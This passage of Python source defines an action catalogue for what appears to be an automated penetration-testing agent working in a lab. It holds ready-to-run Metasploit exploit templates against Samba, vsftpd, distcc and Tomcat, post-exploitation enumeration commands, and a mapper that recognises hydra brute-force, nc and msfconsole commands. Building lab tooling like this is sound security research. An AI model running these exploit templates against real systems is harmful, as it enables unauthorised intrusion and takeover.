        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/samba/usermap_script; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "samba_usermap_script",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt Samba username map script exploit in a controlled lab.",
    },

    601: {
        "name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "vsftpd_234_backdoor",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt vsftpd 2.3.4 backdoor exploit in a controlled lab.",
    },

    602: {
        "name": "MSF_EXPLOIT_DISTCC_EXEC",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "distcc_exec",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt distcc command execution exploit in a controlled lab.",
    },

    603: {
        "name": "MSF_EXPLOIT_TOMCAT_MGR_UPLOAD",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target_ip}; set RPORT {target_port}; set HttpUsername {username}; set HttpPassword {password}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "username", "password"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_valid_credentials": True,
            "requires_service": ["tomcat", "http"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt Tomcat manager upload exploit with known valid credentials in lab.",
    },

     # ============================================================
    # 700-799 POST-EXPLOITATION / SESSION ENUMERATION
    # ============================================================

    700: {
        "name": "POST_ENUM_WHOAMI",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "whoami",
        "command_template": "whoami",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_USER_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify current user in an established session.",
    },

    701: {
        "name": "POST_ENUM_UNAME",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "uname",
        "command_template": "uname -a",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_SYSTEM_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify remote system information in an established session.",
    },

    702: {
        "name": "POST_ENUM_ID",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "id",
        "command_template": "id",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_PRIVILEGES_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect current user UID, GID and groups in an established session.",
    },

    703: {
        "name": "POST_ENUM_HOSTNAME",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "hostname",
        "command_template": "hostname",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_HOSTNAME_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify hostname in an established session.",
    },

    704: {
        "name": "POST_ENUM_IP_ADDR",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "ip",
        "command_template": "ip a",
        "placeholders": [],
        "parser_family": "linux_ip_addr",
        "expected_events": ["SESSION_NET_INFO_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect network interfaces in an established session.",
    },
}

def get_action(action_id: int) -> dict:
    return ACTIONS.get(action_id, ACTIONS[0])


def get_action_name(action_id: int) -> str:
    return get_action(action_id)["name"]


def get_command_template(action_id: int) -> str | None:
    return get_action(action_id).get("command_template")


def get_parser_family(action_id: int) -> str | None:
    return get_action(action_id).get("parser_family")

def get_expected_events(action_id: int) -> list[str]:
    return get_action(action_id).get("expected_events", [])


def get_placeholders(action_id: int) -> list[str]:
    return get_action(action_id).get("placeholders", [])


def get_preconditions(action_id: int) -> dict:
    return get_action(action_id).get("preconditions", {})


def extract_action_id_from_cmd(cmd: str) -> int:
    """
    Extracts the closest semantic action_id from a free-form command.
    Used mainly in observation mode to map human commands to action labels.
    """
    if not cmd:
        return None

    s = cmd.strip().lower()
    s = re.sub(r"\s+", " ", s)

    # Windows (acepta "ipconfig" y "ipconfig /all")
    if s == "ipconfig" or s.startswith("ipconfig "):
        return 1
    if s == "arp" or s.startswith("arp "):
        return 2
    if s == "route" or s.startswith("route "):
        return 3
    # ping -n 1 <ipv4>
    if re.fullmatch(r"ping -n 1 (?:\d{1,3}\.){3}\d{1,3}", s):
        return 4
    # ping -n 1 <ipv4> (y también ping <ipv4> como fallback MVP)
    if re.fullmatch(r"ping (?:\d{1,3}\.){3}\d{1,3}", s):
        return 4
    
    # ============================================================
    # Local attacker context
    # ============================================================

    if s == "hostname":
        return 100
    if s == "ip a":
        return 101
    if s == "ip r":
        return 102
    if s == "ip neigh":
        return 103
    if s == "ss -tulpn":
        return 104
    if re.fullmatch(r"ping -c 1(?: -w \d+)?(?: -w \d+)? (?:\d{1,3}\.){3}\d{1,3}", s):
        return 105
    if s.startswith("traceroute "):
        return 106
    
     # ============================================================
    # Recon / discovery
    # ============================================================

    if s.startswith("nmap -sn "):
        return 200
    if s == "arp-scan --localnet":
        return 201
    if s.startswith("arp-scan "):
        return 202
    if s.startswith("netdiscover -r "):
        return 203
    if s.startswith("fping ") and " -g " in s:
        return 204

    # ============================================================
    # Port scanning
    # ============================================================

    if s.startswith("nmap ") and "--top-ports" in s and "--open" in s and "-su" not in s:
        return 210
    if s.startswith("nmap ") and "-p-" in s and "--open" in s:
        return 211
    if s.startswith("nmap ") and " -f " in s:
        return 212
    if s.startswith("nmap ") and "-su" in s:
        return 213

    # ============================================================
    # Service detection
    # ============================================================

    if s.startswith("nmap ") and "-sv" in s and "-sc" in s:
        return 220
    if s.startswith("nmap ") and "-sv" in s and "--version-light" in s:
        return 221
    if s.startswith("nmap ") and " -a " in s:
        return 222
    if s.startswith("nmap ") and "-sc" in s:
        return 230

    # ============================================================
    # HTTP / HTTPS
    # ============================================================

    if s.startswith("curl -i ") or s.startswith("curl -i --") or s.startswith("curl -k -i "):
        return 300
    if s.startswith("curl -l ") or s.startswith("curl -l --") or "curl -l" in s:
        return 301
    if s.startswith("curl -k -i ") and "https://" in s:
        return 302
    if "robots.txt" in s and s.startswith("curl "):
        return 303
    if s.startswith("gobuster dir "):
        return 310
    if s.startswith("feroxbuster "):
        return 311
    if s.startswith("nikto "):
        return 312
    if s.startswith("whatweb "):
        return 313
    if s.startswith("wafw00f "):
        return 314

    # ============================================================
    # SMB
    # ============================================================

    if s.startswith("smbclient -l ") or s.startswith("smbclient -l//") or s.startswith("smbclient -l //"):
        return 320
    if s.startswith("enum4linux "):
        return 321
    if s.startswith("rpcclient ") and "enumdomusers" in s:
        return 322
    if s.startswith("nmap ") and "smb-os-discovery" in s:
        return 323
    if s.startswith("nmap ") and "smb-protocols" in s:
        return 324

    # ============================================================
    # FTP
    # ============================================================

    if s.startswith("nc ") or s.startswith("netcat "):
        return 330
    if s.startswith("nmap ") and "ftp-anon" in s:
        return 331
    if s.startswith("nmap ") and "ftp-" in s:
        return 332

    # ============================================================
    # SSH
    # ============================================================

    if s.startswith("nmap ") and ("ssh2-enum-algos" in s or "ssh-hostkey" in s):
        return 341

    # ============================================================
    # DNS
    # ============================================================

    if s.startswith("dig ") and "version.bind" in s:
        return 350
    if s.startswith("dig ") and " any" in s:
        return 351
    if s.startswith("dig axfr "):
        return 352

    # ============================================================
    # NFS / RPC
    # ============================================================

    if s.startswith("showmount -e "):
        return 360
    if s.startswith("rpcinfo -p "):
        return 361

    # ============================================================
    # Databases / RDP / VNC
    # ============================================================

    if s.startswith("nmap ") and "mysql-info" in s:
        return 370
    if s.startswith("nmap ") and "pgsql" in s:
        return 371
    if s.startswith("nmap ") and ("rdp-enum-encryption" in s or "rdp-ntlm-info" in s):
        return 380
    if s.startswith("nmap ") and "vnc-info" in s:
        return 381

    # ============================================================
    # Vulnerability discovery
    # ============================================================

    if s.startswith("searchsploit "):
        return 400
    if s.startswith("nmap ") and "--script vuln" in s:
        return 401
    if s.startswith("nmap ") and "smb-vuln" in s:
        return 410
    if s.startswith("nmap ") and "ssl-enum-ciphers" in s:
        return 412
    if s.startswith("nmap ") and "ftp-vsftpd-backdoor" in s:
        return 413

    # ============================================================
    # Credential attacks / lab auth checks
    # ============================================================

    if s.startswith("hydra ") and "ssh://" in s:
        return 500
    if s.startswith("hydra ") and "ftp://" in s:
        return 501
    if s.startswith("hydra ") and "http-post-form" in s:
        return 502

    # ============================================================
    # Metasploit lab exploitation
    # ============================================================

    if s.startswith("msfconsole ") and "usermap_script" in s:
        return 600
    if s.startswith("msfconsole ") and "vsftpd_234_backdoor" in s:
        return 601
    if s.startswith("msfconsole ") and "distcc_exec" in s:
        return 602
    if s.startswith("msfconsole ") and "tomcat_mgr_upload" in s:
        return 603

    # ============================================================
    # Post-exploitation
    # ============================================================

    if s == "whoami":
        return 700
    if s == "uname -a":
        return 701
    if s == "id":
        return 702

    return None